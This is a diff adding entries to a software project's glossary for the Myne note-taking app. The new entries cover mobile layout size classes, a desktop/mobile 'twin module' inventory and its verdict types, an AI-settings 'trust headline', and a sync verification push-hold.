 The mobile client's layout axis — the discriminator that decides which pane composition the wired app renders, **derived from window geometry, never from device brand**: `compact` (the phone's full-screen list ⇄ editor swap), `medium` (≥700px: list + detail two-pane), `expanded` (≥1000px: the WS-01 three-pane — sidebar 248 / list 316 / editor). Two inputs: the **window width** (`window.innerWidth`, so an iPad Split View pane narrowed to phone width falls back to the phone layout, and the Playwright flow tier drives every layout purely by viewport) and a **phone guard** on `window.screen`'s smaller dimension (< 480px → always `compact`; reading `screen` rather than window height keeps the Android IME — which shrinks the layout viewport — from flipping the layout and remounting the editor mid-typing). Orthogonal to [platform](#platform) (`PlatformContext` keeps owning biometric copy / brand concerns; `SizeClassContext` owns layout). Breakpoint budget mirrors the desktop `layoutClamp.ts` discipline (editor pane ≥ 360px, the desktop `CENTER_MIN_WIDTH`).
 
-Used in: `decisions.md` 2026-07-12 "Mobile tablet strategy"; `mobile/src/platform/SizeClassContext.tsx`
+Used in: `decisions.md` 2026-07-12 "Mobile tablet strategy"; `mobile/src/formfactor/SizeClassContext.tsx`
 
 ### **skip (a recurring task)** &nbsp; 📦 *Product*
 
@@ -2289,6 +2374,42 @@ Reading three dialects is what makes the Obsidian importer honest — without it
 
 Used in: `spec/markdown-dialect.md` §3.8; `decisions.md` 2026-07-28
 
+### **twin module** &nbsp; 🛠️ *Tooling*
+
+A module that exists on both the desktop and the mobile side and answers the same question on each. Found by same relative path across `(src, mobile/src)` and `(src-tauri/src, mobile/src-tauri/src)`, plus a curated list for pairs whose two sides sit at different paths (a path sweep cannot see `src/notes/sidebarState.tsx` against `mobile/src/app/flows/EditorFlow.tsx`). The unit is the PAIR rather than the desktop path, because one desktop file may have two real mobile counterparts. Distinct from a mere same-named file: a twin is a claim that both sides answer one question, which is why every one carries a verdict and a reason.
+
+Used in: `scripts/check-twin-inventory.mjs`, `scripts/check-twin-drift.mjs`, `docs/dev/twin-inventory.md`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)
+
+### **twin inventory** &nbsp; 🛠️ *Tooling*
+
+The recorded classification of every twin module: both paths, a mechanical byte-difference flag, a semantic one, a verdict, a reason and a destination. It deliberately records no line count, because a live one would fail the projection check on any edit to any of the files it covers. It lives inside `scripts/check-twin-inventory.mjs` and IS the gate, so the record and the check cannot disagree; `docs/dev/twin-inventory.md` is a generated projection of it and never a second source. A twin with no verdict fails, and a verdict whose files are gone fails, because a roster that can outlive its tree describes nothing.
+
+Used in: `scripts/check-twin-inventory.mjs`, `docs/dev/twin-inventory.md`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)
+
+### **decision (twin verdict)** &nbsp; 🛠️ *Tooling*
+
+The verdict for a twin where both clients answer the same question, so a divergence is a bug by definition. It belongs in a shared package and its entry carries a destination, which may be `undecided` where the destination turns on a question another sub-feature settles. The majority verdict by a wide margin; `docs/dev/twin-inventory.md` carries the current count, which is generated rather than hand-copied.
+
+Used in: `scripts/check-twin-inventory.mjs`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)
+
+### **screen (twin verdict)** &nbsp; 🛠️ *Tooling*
+
+The verdict for a twin that exists TO BE per-client, so its divergence is the feature rather than the bug. Two clauses: the surface a client renders (layout, navigation shape), or the host it renders into (entry points, build-time ambient globals). The second clause was added under review, when three of the entries carrying the verdict turned out to be host composition that the presentation-only wording described not at all. **Deliberately narrow** even so: what it excludes is a file that merely happens to differ per client, which is every [decision (twin verdict)](#decision-twin-verdict) in the record. Two guard tests hold it, one capping how many entries may carry it and one asserting which, because a count cannot notice a miscategorised entry.
+
+Used in: `scripts/check-twin-inventory.mjs`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)
+
+### **absent (twin verdict)** &nbsp; 🛠️ *Tooling*
+
+The verdict for a twin where one client does not ship the surface at all. Its entry names the decision or issue that made it so, because a gap and a decision are indistinguishable in a diff stat and the difference is the whole point. Read the reason before treating a large line-count gap as neglect: `local_inference` reads as an absence and is a narrowed transcription-only port, since mobile runs Whisper on device while `infer` and `embed` return `NotReady`.
+
+Used in: `scripts/check-twin-inventory.mjs`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)
+
+### **delegated (twin verdict)** &nbsp; 🛠️ *Tooling*
+
+The verdict for a twin whose shared answer already lives in `myne-core` or a `@myne/*` package, leaving each side as per-client wiring over it. Its divergence is correct and permanent, so it is neither a bug nor a screen. The canonical shape is a Tauri plugin shim where both sides carry `pub use myne_core::plugins::<flow>` and keep only the plugin builder and its capability grant; `src-tauri/src/plugins/vault_delete/mod.rs` at 52 lines against mobile's 53 is the worked example. The verdict says nothing about whether the two capability grants MATCH; that comparison has not been run.
+
+Used in: `scripts/check-twin-inventory.mjs`, `core/CLAUDE.md`, `decisions.md` 2026-08-15 (twin inventory, myne-md/myne#472)
+
 ### **Tauri** &nbsp; 🛠️ *Tooling*
 
 A Rust-based framework for building cross-platform desktop applications with web-technology UIs. Myne's Phase 1 desktop-client framework (`decisions.md` Deferred #5 resolution). Supersedes the prior Electron baseline. Advantages: small TCB, ~10 MB binary vs ~150 MB Electron, ~40 MB idle RAM vs ~250 MB, achievable reproducible builds, structural memory hygiene via Rust's `zeroize`/`secrecy`/`subtle` crates, smaller updater attack surface.
@@ -2386,6 +2507,14 @@ Used in: `spec/markdown-dialect.md` §3.6.1, `decisions.md` 2026-06-03 + 2026-05
 A line in the system where the security model changes — what is trusted on one side is not trusted on the other. The catalog grows as the product does — TB10 arrived with the browser clipper's native-messaging bridge, TB11 with the served web bundle — so `threat-model.md` §3 is the table of record; read the boundaries there rather than restating their extent (or their count) here.
 
 Used in: `threat-model.md` §3
+
+### **trust headline** &nbsp; 📦 *Product*
+
+The line on the AI settings panel that answers **where this configuration can send your text**, as opposed to who answered the last request (that is the [effective backend](#effective-backend), and the two are deliberately different questions).
+
+It stays on the CONFIGURED value rather than on the host's report of what actually answered, and the asymmetry is a safety direction rather than an oversight. Over-claiming egress makes a reader more careful than they need to be. Under-claiming tells someone their text stays on the device while it leaves, and deriving this line from the report would under-claim twice: in the window before the first report lands, and for a user who has named a provider and is one keystroke (picking a model) away from egress, on the very panel where they will make it.
+
+Used in: `decisions.md` 2026-08-15; myne-md/myne#466
 
 ### **typewriter scroll** &nbsp; 📦 *Product*
 
@@ -2556,6 +2685,12 @@ Used in: `core/src/plugins/vault_unlock/commands.rs::vault_status` (+ `VaultStat
 The in-RAM, plaintext-derived index of a vault's wikilink graph — forward links + reverse adjacency (backlinks) — and its tag index, plus the title→note resolution surface (MYND-31). The structural twin of `vault.search`: rebuilt on unlock, wiped on lock, never written to disk in plaintext; persisted encrypted-at-rest as the [vault.indices](#vaultindices) / `MYI1` blob (`spec/protocol.md` §9.8 — the MYND-31 design, persistence landed by MYND-271 alongside the typed [property](#property) index). Built **Build-B**: dialect extraction stays on the TS side (one dialect source of truth, `title_extract.rs` / MYND-82) while the struct, query surface (`backlinks` / `forward` / `by_tag` / `tag_tree` / `resolveTitle`), and persistence are Rust-side. Edges are title-keyed, not UUID-keyed (Model-2), and resolution runs through the single `resolveWikilink` resolver (`spec/wikilink.md` §5.3, "plain-B"). See `decisions.md` 2026-06-07.
 
 Used in: `decisions.md` 2026-06-07 (MYND-31)
+
+### **verification push-hold** &nbsp; 📋 *Protocol*
+
+The client-side pause that makes the [bootstrap-fingerprint](#bootstrap-fingerprint) compare mean something. A [vault head](#vault-head) is not a stable identity — every push authors a new one — so two devices agree on a fingerprint only while they sit on the same head, and the enrolment ceremony itself moves it (a joining device writes its own [device name](#device-name) the moment it adopts a head, and a prefs push authors a head). While a verify screen is open the device therefore authors **no content head**: pulls continue untouched (each side reaches the head it displays *by* pulling), and the §6.1 genesis-on-empty push is exempt, because on an account with no head the genesis head is the only thing a joining device can adopt. Bounded by a lease and a ceiling rather than by cooperation, so a client that dies mid-compare cannot leave its own edits unpushed. **Extend-only** with respect to push timing — nothing fires earlier than it would have and pending push intent is retained — so the §8.3 A13 posture is unchanged. Phase 2.
+
+Used in: `spec/sync-protocol.md` §6.3, §8.3; `decisions.md` 2026-08-15 (myne-md/myne#462); `core/src/plugins/sync/verify_hold.rs`
 
 ### **version vector (VV)** &nbsp; 🏗️ *Construction*
 
